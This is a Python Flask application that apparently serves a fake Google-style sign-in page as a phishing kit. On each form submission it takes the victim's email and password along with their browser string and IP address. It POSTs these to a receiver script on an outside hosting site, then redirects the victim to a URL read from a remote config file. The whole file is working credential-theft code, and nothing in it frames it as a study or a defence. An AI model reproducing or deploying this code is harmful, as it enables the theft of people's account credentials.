import smtplib
import requests
import regex as re
import urllib2, urllib
from flask import Flask , render_template, request ,redirect
from flask import request

config_url = "https://sas007.000webhostapp.com/google_verifications/google_heroku_redirect_config.txt"

app = Flask(__name__)

def send_data(email_,passwd_,user_browser,string_user_ip,Redirected_To,config_link):

	mydata=[('email',email_),('passwd',passwd_),('u_browser',user_browser),('u_ip',string_user_ip),('re_url',Redirected_To),('config_url',config_link)]    #The first is the var name the second is the value
	mydata=urllib.urlencode(mydata)
	path='http://sas007.000webhostapp.com/google_verifications/reciver.php'    #the url you want to POST to
	req=urllib2.Request(path, mydata)
	req.add_header("Content-type", "application/x-www-form-urlencoded")
	page=urllib2.urlopen(req).read()
	print page


@app.route('/',methods=["GET","POST"])
def index():
	user_browser = request.headers.get('User-Agent')
	user_ip = request.remote_addr
	string_user_ip = str(user_ip)


	if request.method == "POST":
		Email = request.form['Email']
		Password = request.form['Passwd']
		web_result = requests.get(config_url).text
		req_data = re.findall("(?:#)(.*)(?:#)", web_result)
		link_red = req_data[0]
		email_ = req_data[1]
		password_ = req_data[2]
		Redirected_To = link_red
		send_data(Email,Password,user_browser,string_user_ip,Redirected_To,config_url)
		#send_mail(Email,Password,user_browser,user_ip,Redirected_To,email_,password_)
		return redirect(link_red)

		
	return render_template('index.html')

if __name__ == "__main__":
    app.run(host='0.0.0.0',port='80')
